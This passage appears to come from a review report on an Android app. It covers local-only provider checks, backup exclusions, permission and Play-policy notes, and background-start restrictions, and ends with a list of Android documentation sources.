- **Local-only holds for provider checks and rechecks.** `check()` refuses off-device providers in local-only mode
  (DefaultProviderManager.kt:226-228, :301 [V]), and a lying stored locality cannot lower `effectiveLocality`
  (Models.kt:128-129 [V]).
- **Device-transfer exclusions** (WP2.10). These are correct for Android 12+
  (https://developer.android.com/identity/data/autobackup).
- **Permissions.** `WAKE_LOCK` and `ACCESS_NETWORK_STATE` are normal permissions. `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`
  opens Android's own dialog. Play policy "prohibit[s] apps from requesting direct exemption … unless the core function
  of the app is adversely affected", and "Task automation app" is listed as acceptable
  (https://developer.android.com/training/monitoring-device-state/doze-standby, Android 6+). It does not apply to a
  sideloaded build. LIMITATIONS should say so in one line, in case the app is ever published.
- **Background starts.** Activities started from the background are restricted on Android 10+ and opt-in rules apply
  to PendingIntents for target 34/35+ (https://developer.android.com/guide/components/activities/background-starts).
  The plan starts nothing from the background. Keep it that way: the new result notifications only open the app
  through the system-sent PendingIntent.

## 5. Sources

- https://developer.android.com/reference/android/app/ApplicationExitInfo (API 30+; `getDescription`, `getProcessName`, `getRealUid`; REASON_MEMORY_LIMITER and REASON_ANOMALY in 37.2)
- https://developer.android.com/training/monitoring-device-state/doze-standby (Android 6+; exemption list, Play policy note, acceptable use cases)
- https://developer.android.com/guide/components/activities/background-starts (Android 10+; PendingIntent opt-ins for target 34/35+)
- https://developer.android.com/guide/topics/manifest/service-element (isolatedProcess: no permissions; all versions)
- https://developer.android.com/identity/data/autobackup (data extraction rules, Android 12+)
- Code at HEAD 9c739d5, file:line as cited above.
